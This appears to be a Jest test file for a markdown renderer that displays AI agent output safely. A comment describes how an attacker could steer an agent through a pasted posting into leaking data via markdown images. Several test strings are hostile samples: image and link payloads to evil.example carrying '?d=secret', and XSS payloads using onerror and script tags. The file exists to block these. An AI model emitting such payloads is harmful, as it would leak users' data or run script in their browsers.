import { renderAgentMarkdown } from "@/lib/agent/markdown";

describe("renderAgentMarkdown", () => {
  it("renders headings, lists and bold", () => {
    const html = renderAgentMarkdown("## Summary\n\n- one\n- two\n\n**bold**");
    expect(html).toContain("<h2>Summary</h2>");
    expect(html).toContain("<li>one</li>");
    expect(html).toContain("<strong>bold</strong>");
  });

  // The exfiltration channel. A markdown image is a GET the user never chose,
  // and the model's output is attacker-influenceable through a pasted posting.
  it("never emits an img tag, whatever the model writes", () => {
    for (const input of [
      "![x](https://evil.example/a.png)",
      "<img src=x onerror=alert(1)>",
      "![ref][1]\n\n[1]: https://evil.example/a.png",
    ]) {
      expect(renderAgentMarkdown(input)).not.toContain("<img");
    }
  });

  it("never emits an anchor, and keeps the URL visible as text", () => {
    const html = renderAgentMarkdown("[click](https://evil.example/?d=secret)");
    expect(html).not.toContain("<a");
    expect(html).toContain("https://evil.example/?d=secret");
  });

  it("does not autolink a bare URL", () => {
    expect(renderAgentMarkdown("see https://evil.example/?d=x")).not.toContain("<a");
  });

  it("escapes raw HTML rather than passing it through", () => {
    const html = renderAgentMarkdown("<script>alert(1)</script>");
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("strips complete and unterminated think blocks", () => {
    expect(renderAgentMarkdown("<think>hidden</think>visible")).toContain("visible");
    expect(renderAgentMarkdown("<think>hidden</think>visible")).not.toContain("hidden");
    expect(renderAgentMarkdown("shown<think>still thinking")).not.toContain("still thinking");
  });

  it("returns an empty string for empty input", () => {
    expect(renderAgentMarkdown("")).toBe("");
  });
});
